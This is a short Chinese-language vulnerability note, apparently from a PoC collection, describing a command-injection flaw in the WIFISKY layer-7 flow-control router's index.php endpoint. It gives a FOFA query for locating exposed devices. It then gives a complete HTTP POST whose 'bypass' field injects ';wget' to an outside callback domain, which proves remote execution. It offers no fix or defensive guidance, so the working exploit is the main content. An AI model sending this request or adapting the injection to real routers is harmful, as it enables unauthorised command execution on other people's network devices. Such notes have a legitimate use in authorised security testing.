# WIFISKY 7层流控路由器index存在命令执行漏洞

# 一、漏洞简介
WIFISKY-7层流控路由器是深圳市领空技术有限公司（简称“领空技术"）的一款产品，深圳市领空技术有限公司是扎根深圳辐射的网络通讯设备供应商，致力于网络通讯设备产品的研究与开发。WIFISKY 7层流控路由器 index 接口存在一个命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

# 二、影响版本
+ WIFISKY-7层流控路由器

# 三、资产测绘
+ fofa`title="WIFISKY 7层流控路由器"`
+ 特征

![1715173367617-aaada69e-bcaf-4f05-8166-b5ff817cdcfe.png](./img/lbdF8AT5TnJVh0_m/1715173367617-aaada69e-bcaf-4f05-8166-b5ff817cdcfe-551146.png)

# 四、漏洞复现
```http
POST /portal/ibilling/index.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

{"type":5,"version":2,"bypass":";wget guzyybmley.dgrh3.cn"}
```

![1717868463587-8eea369e-a6b5-488c-85d3-0242dd3f45d6.png](./img/lbdF8AT5TnJVh0_m/1717868463587-8eea369e-a6b5-488c-85d3-0242dd3f45d6-720469.png)

![1717868416844-14f8d78b-79b8-4b06-8a9a-4e0c81dfea9b.png](./img/lbdF8AT5TnJVh0_m/1717868416844-14f8d78b-79b8-4b06-8a9a-4e0c81dfea9b-880444.png)



> 更新: 2024-06-11 10:28:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gogz90zifcvt0b1o>